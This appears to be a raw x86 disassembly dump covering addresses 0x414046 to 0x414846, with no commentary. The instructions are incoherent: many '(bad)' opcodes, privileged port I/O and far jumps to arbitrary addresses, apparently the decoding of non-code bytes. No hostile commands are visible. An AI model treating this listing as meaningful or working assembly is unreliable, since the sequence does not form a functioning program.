  414046:	xchg   edi,eax
  414047:	ds xor ah,dh
  41404a:	sub    ecx,esi
  41404c:	push   edx
  41404d:	mov    ch,0xff
  41404f:	(bad)  
  414050:	or     BYTE PTR [ebx+0x673b4273],dh
  414056:	mov    dh,0xb0
  414058:	mov    esp,0x5b3f4841
  41405d:	mov    ebp,0x4b68977d
  414062:	sbb    ebx,edx
  414064:	fistp  WORD PTR [ecx]
  414066:	push   es
  414067:	mov    al,BYTE PTR [esi]
  414069:	test   eax,0xc9d09e18
  41406e:	sahf   
  41406f:	pusha  
  414070:	neg    BYTE PTR [edi]
  414072:	in     eax,0x18
  414074:	stos   DWORD PTR es:[edi],eax
  414075:	or     eax,0xc22d6c13
  41407a:	cdq    
  41407b:	jne    0x4140a3
  41407d:	loop   0x41403f
  41407f:	mov    dh,0x13
  414081:	sub    eax,DWORD PTR [ebp+ebp*8+0x44571894]
  414088:	es test dh,0xd7
  41408c:	sub    al,0xa3
  41408e:	out    0xf9,eax
  414090:	push   edx
  414091:	push   es
  414092:	imul   ebx,eax,0x71
  414095:	es sub ebx,ebp
  414098:	adc    BYTE PTR [ebp+0x45],0xcd
  41409c:	adc    eax,0x3996524b
  4140a1:	in     al,0x53
  4140a3:	bound  esp,QWORD PTR [edi-0x49]
  4140a6:	cmp    al,0x9
  4140a8:	cld    
  4140a9:	rcl    BYTE PTR [esi],0xb6
  4140ac:	jb     0x4140c7
  4140ae:	fcom   st(3)
  4140b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140b1:	aam    0x30
  4140b3:	sbb    al,0x4d
  4140b5:	jmp    0x3c6f:0xd53922d4
  4140bc:	pusha  
  4140bd:	test   al,ah
  4140bf:	sbb    eax,0x58f2d26f
  4140c4:	jbe    0x66fa806e
  4140ca:	das    
  4140cb:	pop    ebx
  4140cc:	(bad)  
  4140cd:	and    eax,DWORD PTR cs:[edi-0x6a]
  4140d1:	jge    0x4140b3
  4140d3:	lds    ebp,FWORD PTR cs:[ecx-0x28bc139c]
  4140da:	pop    dx
  4140dc:	xchg   edx,eax
  4140dd:	pop    edi
  4140de:	(bad)  [eax+eax*1+0x6b]
  4140e2:	lea    ebp,[eax]
  4140e4:	dec    esp
  4140e5:	push   0xffffffda
  4140e7:	mov    edi,0xb275cce4
  4140ec:	add    ah,BYTE PTR [esi+edx*2+0x2126b3fd]
  4140f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4140f4:	stc    
  4140f5:	imul   ebx,DWORD PTR [edi],0x7d037bae
  4140fb:	mov    ah,0x53
  4140fd:	test   eax,0xfc930bc5
  414102:	lods   eax,DWORD PTR ds:[esi]
  414103:	and    al,0xc8
  414105:	push   es
  414106:	sbb    BYTE PTR [esi-0x12],ch
  414109:	jno    0x414102
  41410b:	shr    DWORD PTR [edx+esi*1-0x72],0x9e
  414110:	test   eax,0xbe952d40
  414115:	fsubp  st(7),st
  414117:	nop
  414118:	mov    al,ds:0x4a0d79bf
  41411d:	sbb    DWORD PTR [esi],edx
  41411f:	xor    al,0xdf
  414121:	sti    
  414122:	cld    
  414123:	les    eax,FWORD PTR [ebx+0x646a0e6d]
  414129:	xor    BYTE PTR [ebx+0x1b1d2adc],0x60
  414130:	jo     0x41412d
  414132:	jae    0x414149
  414134:	loop   0x41418b
  414136:	and    al,0x41
  414138:	sub    esi,ecx
  41413a:	sbb    ah,BYTE PTR [eax]
  41413c:	ret    0xf869
  41413f:	xchg   ebx,eax
  414140:	xchg   ebp,eax
  414141:	nop
  414142:	(bad)  
  414143:	cmp    al,0x5c
  414145:	add    al,0x94
  414147:	inc    edi
  414148:	adc    al,0xd
  41414a:	or     DWORD PTR [ebp+0x43],edi
  41414d:	jno    0x4141cd
  41414f:	pcmpgtb mm0,QWORD PTR [edi]
  414152:	xchg   esp,eax
  414153:	add    ch,BYTE PTR [ecx]
  414155:	enter  0xd34d,0x33
  414159:	or     BYTE PTR [edx+esi*8-0x5895c3ba],0xab
  414161:	and    al,0x80
  414163:	mov    esp,0xd7635a72
  414168:	lods   eax,DWORD PTR ds:[esi]
  414169:	sbb    DWORD PTR [edi+0x5e],0x42f72b38
  414170:	add    al,0xef
  414172:	stos   BYTE PTR es:[edi],al
  414173:	sbb    DWORD PTR [ebx+0x34a0d05b],esi
  414179:	adc    bh,BYTE PTR [edi-0x460c237c]
  41417f:	push   edx
  414180:	jp     0x41412c
  414182:	cmp    al,0xc8
  414184:	fisub  DWORD PTR [ebp-0x2e9f0227]
  41418a:	xchg   BYTE PTR [edi+0x4f],ch
  41418d:	in     eax,0xcd
  41418f:	imul   ebx,DWORD PTR [edx-0x1e],0x21a0fc82
  414196:	sub    ecx,esi
  414198:	fwait
  414199:	or     eax,0x4f
  41419c:	int3   
  41419d:	rol    esp,1
  41419f:	ja     0x414166
  4141a1:	popa   
  4141a2:	enter  0x444b,0x97
  4141a6:	mov    bh,0xd0
  4141a8:	fistp  DWORD PTR [esi-0x5d3b6916]
  4141ae:	mov    eax,ds:0x7ae5b2c4
  4141b3:	push   eax
  4141b4:	fmul   st,st(0)
  4141b6:	sti    
  4141b7:	(bad)  
  4141b9:	and    BYTE PTR [eax],bl
  4141bb:	adc    BYTE PTR [ecx],ah
  4141bd:	cmp    ebp,DWORD PTR [edx-0x5f]
  4141c0:	ins    DWORD PTR es:[edi],dx
  4141c1:	adc    dl,ch
  4141c3:	cld    
  4141c4:	cmp    eax,DWORD PTR [esi-0x6a3134e4]
  4141ca:	inc    esp
  4141cb:	leave  
  4141cc:	mov    edx,0xdf0e454b
  4141d1:	pop    ecx
  4141d2:	jns    0x41416a
  4141d4:	cmp    eax,0x2d9ae84b
  4141d9:	dec    esi
  4141da:	rol    BYTE PTR [esi+ebx*4-0x78],cl
  4141de:	in     al,dx
  4141df:	cmc    
  4141e0:	dec    DWORD PTR [esi-0x2e]
  4141e3:	inc    esi
  4141e4:	sbb    DWORD PTR [ecx],esi
  4141e6:	xchg   ebx,eax
  4141e7:	pop    edi
  4141e8:	aam    0x20
  4141ea:	jnp    0x4141cd
  4141ec:	xor    al,0x68
  4141ee:	imul   ebx,DWORD PTR [esi],0x41
  4141f1:	ret    0xa0c5
  4141f4:	pop    ebp
  4141f5:	imul   ebx,DWORD PTR [ecx],0x13
  4141f8:	inc    ebx
  4141f9:	push   es
  4141fa:	lods   eax,DWORD PTR ds:[esi]
  4141fb:	add    dh,cl
  4141fd:	add    DWORD PTR [ebx+0x4d],edx
  414200:	sbb    DWORD PTR [ebp-0x7c2460cb],ebx
  414206:	or     bl,BYTE PTR [ebp-0x2307acd0]
  41420c:	and    eax,0x35f39750
  414211:	in     eax,0x30
  414213:	outs   dx,DWORD PTR ds:[esi]
  414214:	adc    esi,ebp
  414216:	inc    esi
  414217:	bound  eax,QWORD PTR [edi]
  414219:	pop    ecx
  41421a:	aaa    
  41421b:	stos   BYTE PTR es:[edi],al
  41421c:	fist   DWORD PTR [edx-0x6964b6a7]
  414222:	imul   al
  414224:	pop    ebx
  414225:	xor    al,0xdd
  414227:	stos   DWORD PTR es:[edi],eax
  414228:	sbb    al,0x29
  41422a:	and    ecx,eax
  41422c:	fcomp  DWORD PTR ds:0x4ce01244
  414232:	adc    eax,0xe0c7d889
  414237:	push   esp
  414238:	cdq    
  414239:	stos   DWORD PTR es:[edi],eax
  41423a:	ja     0x41428b
  41423c:	sub    DWORD PTR [esi],esi
  41423e:	fcomp  QWORD PTR [edx+0x6e]
  414241:	sbb    DWORD PTR [esi+0x7d],0x24
  414245:	xor    eax,0x38355f0b
  41424a:	inc    ebp
  41424b:	mov    al,ds:0x69589585
  414250:	fild   DWORD PTR [esi-0x4829b62d]
  414256:	add    ebx,esi
  414258:	xchg   ebx,eax
  414259:	mov    al,0xdc
  41425b:	push   0x92ad56e8
  414260:	sbb    eax,0x4951cf7a
  414265:	fild   QWORD PTR [edi+0x4d]
  414268:	mov    eax,0x354a1e1f
  41426d:	repnz mov DWORD PTR [edx],ebp
  414270:	call   0xbf28:0xd260b6c
  414277:	xlat   BYTE PTR ds:[ebx]
  414278:	mov    esp,0x7dbd6fca
  41427d:	pop    ds
  41427e:	es mov ah,0x97
  414281:	lds    esi,FWORD PTR [ecx]
  414283:	in     al,0xa1
  414285:	inc    ebx
  414286:	inc    esp
  414287:	adc    edx,esi
  414289:	inc    eax
  41428a:	in     eax,0xd9
  41428c:	sahf   
  41428d:	bound  ebx,QWORD PTR [ebx+eax*4-0x5dd711c1]
  414294:	adc    eax,0x9a09fbf4
  414299:	popf   
  41429a:	sbb    ch,0x45
  41429d:	and    dh,BYTE PTR [edx-0x23a735d4]
  4142a3:	fwait
  4142a4:	push   ebx
  4142a5:	dec    edi
  4142a6:	inc    bh
  4142a8:	outs   dx,BYTE PTR ds:[esi]
  4142a9:	jp     0x414240
  4142ab:	test   BYTE PTR [edi-0x209feee],bl
  4142b1:	add    eax,ecx
  4142b3:	jecxz  0x414291
  4142b5:	push   ds
  4142b6:	out    0x57,al
  4142b8:	mov    esp,0xb332eb47
  4142bd:	(bad)  
  4142bf:	lock call 0x3170:0xfed8b138
  4142c7:	call   0x6dcd:0x3e3e091f
  4142ce:	jns    0x41434c
  4142d0:	adc    ecx,DWORD PTR [edi+0x4257d08b]
  4142d6:	test   ax,0x3191
  4142da:	cmc    
  4142db:	push   edx
  4142dc:	xor    BYTE PTR [ecx],cl
  4142de:	test   eax,0x2b54c2eb
  4142e3:	jbe    0x4142c3
  4142e5:	inc    esp
  4142e6:	icebp  
  4142e7:	dec    ecx
  4142e8:	add    dh,BYTE PTR [ecx+0x47]
  4142eb:	cmp    esp,edi
  4142ed:	mov    ds:0xcdc23335,eax
  4142f2:	pop    esi
  4142f3:	addr16 out 0x9,al
  4142f6:	mov    bl,0x8
  4142f8:	inc    edi
  4142f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4142fa:	inc    esi
  4142fb:	cmp    ah,BYTE PTR [edi-0x16]
  4142fe:	stos   BYTE PTR es:[edi],al
  4142ff:	std    
  414300:	mov    al,ds:0x8d8d3d30
  414305:	mov    ds:0xc5a5cf,al
  41430a:	cmp    DWORD PTR [esp+eax*2+0x17b4e0af],ebp
  414311:	retf   
  414312:	cmp    al,BYTE PTR [ecx+0x60]
  414315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414316:	inc    eax
  414317:	jae    0x414380
  414319:	jb     0x414364
  41431b:	pop    esi
  41431c:	xchg   edi,eax
  41431d:	push   0xe65a0055
  414322:	xchg   edx,eax
  414323:	ss popa 
  414325:	lods   al,BYTE PTR ds:[esi]
  414326:	in     eax,dx
  414327:	cmp    dl,bl
  414329:	jecxz  0x4142b6
  41432b:	shl    bl,1
  41432d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41432e:	sub    eax,0xf8effae9
  414333:	mov    edx,0x92126df5
  414338:	dec    esi
  414339:	push   es
  41433a:	iret   
  41433b:	data16 cmp dh,cl
  41433e:	jne    0x414318
  414340:	adc    eax,0xb82a2519
  414345:	pop    ebp
  414346:	ret    0x9fd3
  414349:	int    0x6
  41434b:	(bad)  
  41434c:	push   ss
  41434d:	xchg   ebp,eax
  41434e:	mov    cl,0x1c
  414350:	imul   eax,esi,0x2b1291e3
  414356:	stos   DWORD PTR es:[edi],eax
  414357:	jnp    0x4143d2
  414359:	xor    bl,al
  41435b:	retf   0x563f
  41435e:	daa    
  41435f:	jecxz  0x414301
  414361:	sub    ecx,esp
  414363:	inc    esp
  414364:	adc    DWORD PTR [edi-0x26],edx
  414367:	scas   al,BYTE PTR es:[edi]
  414368:	mov    ds:0x38ff589a,al
  41436d:	ja     0x41438e
  41436f:	or     al,0x6c
  414371:	mov    ecx,0xf05addf5
  414376:	xchg   ebx,eax
  414377:	pop    edi
  414378:	lods   eax,DWORD PTR ds:[esi]
  414379:	fadd   QWORD PTR [eax]
  41437b:	test   DWORD PTR [ecx-0x7d],ecx
  41437e:	rcl    BYTE PTR [eax+ebx*4-0x4f],0xad
  414383:	mov    WORD PTR [ecx+0x42271e3e],fs
  414389:	hlt    
  41438a:	lea    eax,[edx]
  41438c:	shr    bl,cl
  41438e:	das    
  41438f:	pop    ss
  414390:	cmp    al,0xa4
  414392:	popa   
  414393:	mov    bh,0xab
  414395:	inc    esi
  414396:	dec    edi
  414397:	out    0x4f,al
  414399:	test   DWORD PTR [ebx-0x6b],ebp
  41439c:	xchg   ecx,eax
  41439d:	retf   0xc2fb
  4143a0:	mov    bl,0xa4
  4143a2:	ret    
  4143a3:	hlt    
  4143a4:	test   al,0xb0
  4143a6:	or     DWORD PTR [ecx-0x57c2af42],eax
  4143ac:	ds icebp 
  4143ae:	push   eax
  4143af:	and    eax,0x7648566a
  4143b4:	fistp  WORD PTR [edx+0x66e51991]
  4143ba:	(bad)  
  4143bb:	pop    ebp
  4143bc:	lea    ebp,[edi]
  4143be:	fadd   st,st(4)
  4143c0:	fld    DWORD PTR [ecx-0x74]
  4143c3:	mov    al,0x5
  4143c5:	rcl    BYTE PTR [edi+0x4b],1
  4143c8:	push   0x2b
  4143ca:	push   edx
  4143cb:	or     eax,0xdd012a7e
  4143d0:	jne    0x414427
  4143d2:	mov    ss,ebx
  4143d4:	hlt    
  4143d5:	mov    cl,0x3f
  4143d7:	rcl    DWORD PTR ds:0xd7e549f8,cl
  4143dd:	mov    dl,0xa6
  4143df:	mov    dl,BYTE PTR [edi-0x505aeeee]
  4143e5:	mov    dh,0x7c
  4143e7:	mov    edx,0x33b4fee1
  4143ec:	lock les edx,FWORD PTR [ebx+0x636e97d7]
  4143f3:	sub    edi,edi
  4143f5:	pusha  
  4143f6:	jmp    0x6651:0xc76230f8
  4143fd:	bound  ebp,QWORD PTR [edx]
  4143ff:	inc    esi
  414400:	and    dl,dl
  414402:	mov    ds:0x9619e23c,eax
  414407:	les    ebx,FWORD PTR [esi+0x1750e4ce]
  41440d:	sub    al,BYTE PTR [eax+0x2b7987ce]
  414413:	jecxz  0x4143a6
  414415:	rcl    ebp,0xfd
  414418:	push   eax
  414419:	jp     0x4143ac
  41441b:	sbb    ecx,DWORD PTR ss:[edi-0x743c94d3]
  414422:	cwde   
  414423:	das    
  414424:	sub    al,0x1a
  414426:	pop    ecx
  414427:	sub    eax,0xf4ae92d3
  41442c:	sub    al,0x4e
  41442e:	lahf   
  41442f:	add    DWORD PTR [edi-0x7c],esp
  414432:	int3   
  414433:	scas   al,BYTE PTR es:[edi]
  414434:	mov    esi,0x48b448b9
  414439:	ret    0x16a3
  41443c:	mov    BYTE PTR [edi-0x9402cc4],dh
  414442:	sub    cl,BYTE PTR [ecx]
  414444:	and    al,0xca
  414446:	adc    ebx,esp
  414448:	(bad)  
  414449:	cli    
  41444a:	adc    ebp,DWORD PTR [esi+ecx*1+0x1b]
  41444e:	sar    DWORD PTR ds:[ebx+ebp*1+0x653d3143],0x63
  414457:	test   al,0x12
  414459:	daa    
  41445a:	cwde   
  41445b:	push   eax
  41445c:	std    
  41445d:	jnp    0x4144c4
  41445f:	ds mov bl,0x9c
  414462:	ror    BYTE PTR [edi],cl
  414464:	(bad)  
  414465:	dec    edi
  414466:	(bad)  
  414467:	push   0x764541c7
  41446c:	sbb    ebx,DWORD PTR [edx-0x4a6cf62]
  414472:	aaa    
  414473:	out    0xdd,al
  414475:	es ins BYTE PTR es:[edi],dx
  414477:	cmp    eax,0x1b46d0eb
  41447c:	jb     0x4144b4
  41447e:	push   eax
  41447f:	shr    BYTE PTR [esi],1
  414481:	lea    eax,[eax-0x16cba98c]
  414487:	pop    eax
  414488:	sub    al,0x4c
  41448a:	sub    BYTE PTR [eax-0x78],0xdf
  41448e:	pop    sp
  414490:	mov    BYTE PTR [eax],ah
  414492:	and    al,0xcb
  414494:	mov    ebx,DWORD PTR ss:0x80fa7bfc
  41449b:	jno    0x41444e
  41449d:	xor    ebx,ecx
  41449f:	push   ebp
  4144a0:	cli    
  4144a1:	addr16 hlt 
  4144a3:	add    al,0x76
  4144a5:	mov    gs,WORD PTR [ecx+0x7ef1e5db]
  4144ab:	inc    esi
  4144ac:	popa   
  4144ad:	sub    DWORD PTR [edi],edi
  4144af:	je     0x41450b
  4144b1:	das    
  4144b2:	in     eax,0xc
  4144b4:	add    ecx,edi
  4144b6:	enter  0xf355,0x6d
  4144ba:	cwde   
  4144bb:	xor    DWORD PTR [esi+esi*1],esi
  4144be:	add    bl,bl
  4144c0:	inc    ecx
  4144c1:	popa   
  4144c2:	push   ecx
  4144c3:	xor    ah,dl
  4144c5:	popa   
  4144c6:	mov    ah,0x3d
  4144c8:	jmp    0x3c075c78
  4144cd:	sahf   
  4144ce:	mov    ds:0x267a53a3,eax
  4144d3:	cdq    
  4144d4:	lods   eax,DWORD PTR ds:[esi]
  4144d5:	adc    DWORD PTR [ebx],0x194e404
  4144db:	adc    DWORD PTR [esi-0x2e],0x75867c0c
  4144e2:	inc    edx
  4144e3:	or     esp,DWORD PTR [ebx+0x6d]
  4144e6:	div    DWORD PTR [edx+0x124d76ac]
  4144ec:	or     BYTE PTR [ebp+0x51],al
  4144ef:	sbb    esi,DWORD PTR ss:[ebx-0x24]
  4144f3:	cwde   
  4144f4:	out    0x75,al
  4144f6:	and    al,0x21
  4144f8:	das    
  4144f9:	addr16 call 0x8001:0x1e57d4cf
  414501:	mov    bl,0x68
  414503:	outs   dx,DWORD PTR ds:[esi]
  414504:	loope  0x414503
  414506:	mov    al,0xfe
  414508:	and    DWORD PTR ds:0xf1b53eb4,ecx
  41450e:	not    DWORD PTR [ebx+0x48df43d6]
  414514:	jbe    0x41449d
  414516:	cwde   
  414517:	sub    cl,BYTE PTR [eax+0x31fd31d9]
  41451d:	jmp    0x3edd7ef1
  414522:	iret   
  414523:	aad    0xe8
  414525:	or     BYTE PTR [ebx+edi*1+0x5d],al
  414529:	bound  edi,QWORD PTR [ebx+0xca0c536]
  41452f:	xor    eax,0xc3e426aa
  414534:	cdq    
  414535:	fsubr  QWORD PTR [edx-0x69]
  414538:	xor    DWORD PTR [ecx+0x5d],esi
  41453b:	xchg   ecx,eax
  41453c:	enter  0x6c9b,0x2f
  414540:	fidiv  DWORD PTR [ebp+0x13]
  414543:	das    
  414544:	cld    
  414545:	mov    esi,0x2d288be8
  41454a:	jmp    0x52ad:0x6fae1d40
  414551:	loop   0x41457c
  414553:	int    0x20
  414555:	sbb    eax,0x8ad60bc9
  41455a:	pop    ds
  41455b:	mov    ebx,DWORD PTR [ebx]
  41455d:	fiadd  DWORD PTR [esi+0x238d2955]
  414563:	mov    al,ds:0x94bf7d17
  414568:	xor    ebp,eax
  41456a:	cwde   
  41456b:	mov    ebx,0x5a991238
  414570:	gs (bad) 
  414572:	and    DWORD PTR [ecx+0x47ff3618],ebp
  414578:	mov    WORD PTR [ebp+ebp*8-0x13],?
  41457c:	pusha  
  41457d:	dec    ecx
  41457e:	mov    eax,DWORD PTR [ecx]
  414580:	pop    edi
  414581:	sbb    ah,dl
  414583:	or     al,0x47
  414585:	xor    esi,eax
  414587:	xor    DWORD PTR [edx-0x7d4fae52],edx
  41458d:	cs or  eax,0xe6814d89
  414593:	pand   mm5,QWORD PTR [edx+0x65]
  414597:	adc    bl,BYTE PTR [eax-0x2c62061b]
  41459d:	sub    eax,0x30e39f77
  4145a2:	jno    0x414553
  4145a4:	popf   
  4145a5:	jl     0x414577
  4145a7:	or     DWORD PTR [eax],esp
  4145a9:	sub    DWORD PTR [esp],eax
  4145ac:	mov    al,0xaa
  4145ae:	pop    ds
  4145af:	dec    ebp
  4145b0:	cmc    
  4145b1:	leave  
  4145b2:	cld    
  4145b3:	inc    ebx
  4145b4:	lods   eax,DWORD PTR ds:[esi]
  4145b5:	int3   
  4145b6:	pop    ds
  4145b7:	sahf   
  4145b8:	and    ecx,esp
  4145ba:	xchg   edx,eax
  4145bb:	daa    
  4145bc:	ficomp WORD PTR [ecx-0x2e224307]
  4145c2:	ret    0xbb96
  4145c5:	xchg   esp,eax
  4145c6:	push   0xd559764b
  4145cb:	shl    BYTE PTR [edx],cl
  4145cd:	(bad)  
  4145ce:	adc    BYTE PTR ds:0x460b145a,dl
  4145d4:	in     eax,dx
  4145d5:	add    BYTE PTR [ebp-0x18],bl
  4145d8:	mov    dh,bl
  4145da:	mov    ch,0x75
  4145dc:	sub    BYTE PTR [edx-0x24],dh
  4145df:	dec    edx
  4145e0:	mov    bh,0xa8
  4145e2:	push   0x28740c6d
  4145e7:	mov    eax,ds:0x3d65d2e9
  4145ec:	inc    edi
  4145ed:	jge    0x41457d
  4145ef:	out    dx,al
  4145f0:	shl    BYTE PTR [esi],1
  4145f2:	xor    al,0x39
  4145f4:	push   ebx
  4145f5:	call   FWORD PTR [edx+0x6fbce402]
  4145fb:	stos   DWORD PTR es:[edi],eax
  4145fc:	rcr    esp,0x75
  4145ff:	cmc    
  414600:	inc    DWORD PTR [ebx+ebp*1+0x2e79ddc]
  414607:	xchg   esp,eax
  414608:	dec    ebx
  414609:	mov    ecx,0x6747db3e
  41460e:	(bad)  [ebx]
  414610:	sub    eax,0xb56297b8
  414615:	jl     0x414677
  414617:	mov    ebp,0xa1a83939
  41461c:	in     eax,dx
  41461d:	daa    
  41461e:	jp     0x41464b
  414620:	jge    0x414688
  414622:	out    0x1e,eax
  414624:	mov    eax,ds:0xa7355080
  414629:	cmp    BYTE PTR [eax],cl
  41462b:	mov    esp,0x6704bd5a
  414630:	cdq    
  414631:	lods   eax,DWORD PTR ds:[esi]
  414632:	sbb    esi,esi
  414634:	rol    dl,1
  414636:	add    eax,0x8772f9a6
  41463b:	imul   esp,DWORD PTR [edi+ecx*8+0x38d6e0c2],0x1b0ef73b
  414646:	in     al,dx
  414647:	fistp  QWORD PTR [esi-0x71]
  41464a:	ins    BYTE PTR es:[edi],dx
  41464b:	or     al,0x99
  41464d:	lea    edx,[esi-0x6d]
  414650:	xor    DWORD PTR [eax],edx
  414652:	sub    DWORD PTR [edi-0x4c],ebp
  414655:	push   edx
  414656:	xlat   BYTE PTR ds:[ebx]
  414657:	aas    
  414658:	out    0xf8,al
  41465a:	out    0x6a,eax
  41465c:	fst    QWORD PTR ds:0x969a03d8
  414662:	xor    esi,DWORD PTR gs:[eax+0x181a6425]
  414669:	fidivr DWORD PTR [eax-0x5f]
  41466c:	out    0x82,eax
  41466e:	and    DWORD PTR ds:0x28e182bd,esp
  414674:	out    dx,al
  414675:	aam    0xa1
  414677:	cmp    BYTE PTR [edx+0x71],bl
  41467a:	push   ebp
  41467b:	jbe    0x4146e5
  41467d:	jge    0x4146d1
  41467f:	fidiv  DWORD PTR [esi+0x57cb3ccf]
  414685:	mov    esi,0xfcd7e700
  41468a:	popf   
  41468b:	push   0xe9047006
  414690:	out    0x7a,eax
  414692:	je     0x41464d
  414694:	mov    ds:0x4ad8cc24,eax
  414699:	push   eax
  41469a:	mov    ds:0xc6e9a156,al
  41469f:	in     eax,dx
  4146a0:	mov    dh,0xc6
  4146a2:	ss mov ebx,0x7a9e274f
  4146a8:	mov    dl,0xf7
  4146aa:	push   esi
  4146ab:	jp     0x4146e1
  4146ad:	mov    ch,0xaf
  4146af:	cmp    al,0x98
  4146b1:	js     0x4146b4
  4146b3:	inc    esi
  4146b4:	dec    edi
  4146b5:	and    dl,dh
  4146b7:	les    esi,FWORD PTR [esi+0x37c286e0]
  4146bd:	(bad)  
  4146be:	cld    
  4146bf:	das    
  4146c0:	xchg   ebx,eax
  4146c1:	dec    ebx
  4146c2:	ins    BYTE PTR es:[edi],dx
  4146c3:	sbb    al,0x52
  4146c5:	xchg   ecx,eax
  4146c6:	or     ecx,edi
  4146c8:	inc    edi
  4146c9:	sbb    BYTE PTR [ecx],bh
  4146cb:	jle    0x41466e
  4146cd:	sub    al,0xf3
  4146cf:	test   DWORD PTR [esi+edx*1],esp
  4146d2:	xor    bh,bh
  4146d4:	mov    al,ds:0x7900ab89
  4146d9:	in     al,dx
  4146da:	xchg   ecx,eax
  4146db:	sbb    al,BYTE PTR [ebp-0x4293bd89]
  4146e1:	jb     0x414761
  4146e3:	inc    ecx
  4146e4:	ins    DWORD PTR es:[edi],dx
  4146e5:	sub    BYTE PTR [edi],dl
  4146e7:	push   0xffffffde
  4146e9:	sti    
  4146ea:	or     bl,ah
  4146ec:	jae    0x4146b7
  4146ee:	fs cmp al,0x7b
  4146f1:	test   BYTE PTR [ecx-0x5],0xbe
  4146f5:	pop    esi
  4146f6:	mov    cl,0x1d
  4146f8:	das    
  4146f9:	loop   0x4146c2
  4146fb:	sub    ebx,edx
  4146fd:	test   eax,esp
  4146ff:	aam    0xb4
  414701:	popa   
  414702:	mov    ds:0xc8d8e346,eax
  414707:	pop    edx
  414708:	mov    DWORD PTR ds:0xfb393684,edi
  41470e:	scas   eax,DWORD PTR es:[edi]
  41470f:	fild   DWORD PTR [ebx]
  414711:	test   BYTE PTR ds:0x88eb24c2,dl
  414717:	push   0xfffffff5
  414719:	xchg   edi,eax
  41471a:	push   0x6e7fd387
  41471f:	mov    ah,0xa6
  414721:	test   BYTE PTR [edi-0x5c],bh
  414724:	scas   al,BYTE PTR es:[edi]
  414725:	cmp    DWORD PTR [ecx+0x2d],eax
  414728:	push   ebx
  414729:	iret   
  41472a:	jl     0x4146c7
  41472c:	nop
  41472d:	jae    0x414775
  41472f:	lahf   
  414730:	push   cs
  414731:	pop    ss
  414732:	je     0x414779
  414734:	repnz adc BYTE PTR [esi+edx*8-0x4b05d17c],bh
  41473c:	jo     0x414789
  41473e:	cmp    al,0x8e
  414740:	rol    DWORD PTR [esi-0x6a],0x25
  414744:	pop    es
  414745:	test   DWORD PTR [ebp+0x5139b18f],eax
  41474b:	mov    ebp,es
  41474d:	jmp    0x414702
  41474f:	push   0x53501ebb
  414754:	(bad)  
  414755:	pop    edi
  414756:	mov    bl,0xd2
  414758:	jb     0x41471c
  41475a:	or     DWORD PTR [ecx+0x39],edi
  41475d:	test   al,0xfc
  41475f:	push   cs
  414760:	lods   eax,DWORD PTR ds:[esi]
  414761:	in     al,0xd
  414763:	mov    ah,0x53
  414765:	bound  ebp,QWORD PTR [edi+eiz*2+0x78]
  414769:	sbb    al,0xc2
  41476b:	cmp    al,0xea
  41476d:	inc    edi
  41476e:	int3   
  41476f:	js     0x41474d
  414771:	test   DWORD PTR [edx-0xf],edi
  414774:	jl     0x41471a
  414776:	xor    DWORD PTR [ebx+0x692df07e],0xbb802978
  414780:	fdiv   QWORD PTR [eax-0x44]
  414783:	fs inc edi
  414785:	lods   eax,DWORD PTR ds:[esi]
  414786:	and    eax,0x8c2cfa6a
  41478b:	dec    BYTE PTR [edi+0x6d7e6099]
  414791:	ins    DWORD PTR es:[edi],dx
  414792:	shl    DWORD PTR [esi-0x77fc382f],cl
  414798:	dec    esi
  414799:	jmp    0x41e6:0x5066c532
  4147a0:	icebp  
  4147a1:	jnp    0x41476d
  4147a3:	or     dl,ch
  4147a5:	xchg   esi,eax
  4147a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4147a7:	or     edi,esp
  4147a9:	add    ch,BYTE PTR [eax-0x66]
  4147ac:	lock repnz pop esp
  4147af:	pop    edi
  4147b0:	or     dl,BYTE PTR [eax]
  4147b2:	push   esp
  4147b3:	cmp    BYTE PTR [edx+0x67],dl
  4147b6:	js     0x414756
  4147b8:	inc    esi
  4147b9:	jle    0x41478c
  4147bb:	push   ebx
  4147bc:	dec    esi
  4147bd:	ins    BYTE PTR es:[edi],dx
  4147be:	mov    ecx,esp
  4147c0:	fdivr  DWORD PTR [ebx-0x23]
  4147c3:	cmc    
  4147c4:	scas   eax,DWORD PTR es:[edi]
  4147c5:	int3   
  4147c6:	nop
  4147c7:	push   0xffffffa7
  4147c9:	fmul   QWORD PTR [edx-0x7a565851]
  4147cf:	(bad)
  4147d2:	mov    bh,0x41
  4147d4:	(bad)  
  4147d6:	push   cs
  4147d7:	in     al,dx
  4147d8:	pop    es
  4147d9:	outs   dx,DWORD PTR ds:[esi]
  4147da:	ret    0x8c36
  4147dd:	mov    dh,0x1e
  4147df:	push   0x62
  4147e1:	std    
  4147e2:	js     0x4147bd
  4147e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147e5:	mov    ds:0x2a71877b,al
  4147ea:	jb     0x414867
  4147ec:	push   es
  4147ed:	pop    edi
  4147ee:	int    0x5d
  4147f0:	shl    esp,cl
  4147f2:	fisubr WORD PTR [edi+0x7c]
  4147f5:	fs xchg ecx,eax
  4147f7:	sub    DWORD PTR [edi+0x5ef15e29],ecx
  4147fd:	dec    edx
  4147fe:	out    0x80,eax
  414800:	add    BYTE PTR [eax-0x70],cl
  414803:	stc    
  414804:	xor    esp,esi
  414806:	sar    ah,0xa0
  414809:	aas    
  41480a:	xchg   esi,eax
  41480b:	inc    eax
  41480c:	jmp    0x414840
  41480e:	inc    edx
  41480f:	mov    eax,0xaca2ec5d
  414814:	mov    DWORD PTR [ecx-0x32960d6a],eax
  41481a:	in     al,0xce
  41481c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41481d:	scas   eax,DWORD PTR es:[edi]
  41481e:	in     al,dx
  41481f:	pop    ebx
  414820:	outs   dx,DWORD PTR ds:[esi]
  414821:	mov    edi,DWORD PTR [ebx]
  414823:	cli    
  414824:	das    
  414825:	aad    0x24
  414827:	inc    ebp
  414828:	and    eax,0xe2667e6b
  41482d:	mov    bh,0xf2
  41482f:	xor    BYTE PTR [ecx-0x37],bh
  414832:	mov    DWORD PTR [ebx+0x15],esi
  414835:	fsubr  st,st(3)
  414837:	int3   
  414838:	push   ebp
  414839:	pop    esi
  41483a:	or     al,0x13
  41483c:	jmp    0x2b5f39a3
  414841:	jmp    0x2f2661cc
  414846:	dec    esi
